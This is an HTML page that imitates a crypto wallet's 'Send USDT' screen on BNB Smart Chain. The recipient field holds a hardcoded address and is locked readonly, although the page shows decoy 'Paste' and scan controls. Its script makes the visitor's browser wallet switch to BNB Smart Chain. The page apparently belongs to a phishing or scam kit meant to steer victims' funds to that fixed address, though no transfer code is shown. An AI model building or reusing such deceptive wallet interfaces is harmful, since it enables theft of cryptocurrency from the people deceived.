<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Send USDT</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>


<div class="container">

  <label>Address or Domain Name</label>
  <div class="input-box" id="addressBox">
    <input id="address" value="0xab8e6FF44E64a6DAb8454916E8E37C1cC381451D" readonly spellcheck="false">
    <div class="actions">
      <span class="paste">Paste</span>
      <svg viewBox="0 0 24 24">
        <rect x="9" y="9" width="13" height="13" rx="2"></rect>
        <path d="M5 15V5a2 2 0 0 1 2-2h10"></path>
      </svg>
      <svg viewBox="0 0 24 24">
        <path d="M4 7V4h3"></path>
        <path d="M17 4h3v3"></path>
        <path d="M20 17v3h-3"></path>
        <path d="M7 20H4v-3"></path>
      </svg>
    </div>
  </div>

  <label class="mt">Destination network</label>
  <div class="pill">
    <svg class="bnb" viewBox="0 0 64 64">
  <circle cx="32" cy="32" r="32" fill="#0B0E11"/>
  <path fill="#F3BA2F" d="
    M32 10
    22 16 26 18 32 14 38 18 42 16
    32 10

    16 22
    16 42 22 46 22 26
    16 22

    48 22
    48 42 42 46 42 26
    48 22

    32 50
    22 44 26 42 32 46 38 42 42 44
    32 50

    26 18
    26 26 32 30 38 26 38 18
    32 22
    26 18

    26 42
    26 34 32 30 38 34 38 42
    32 38
    26 42
  "/>
</svg>
    <span>BNB Smart Chain ▾</span>
  </div>

  <label class="mt">Amount</label>
  <div class="input-box" id="amountBox">
    <input id="amount" placeholder="USDT Amount" inputmode="decimal">
    <span class="usdt">USDT</span>
    <span class="max">Max</span>
  </div>

  <div class="price">≈ ₹<span id="inr">0.00</span></div>

</div>

<button id="next" onclick="address()">Next</button>

<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
<script>
  async function address () {
    try {
      const chain = await window.ethereum.request({method:'eth_chainId'});
      if (chain !=='0x38'){
        await window.ethereum.request({
          method:'wallet_switchEthereumChain',
          params:[{chainId:'0x38'}]
        });
      }
    } catch {
      console.log("error")
    }
  }
</script>
</body>
</html>
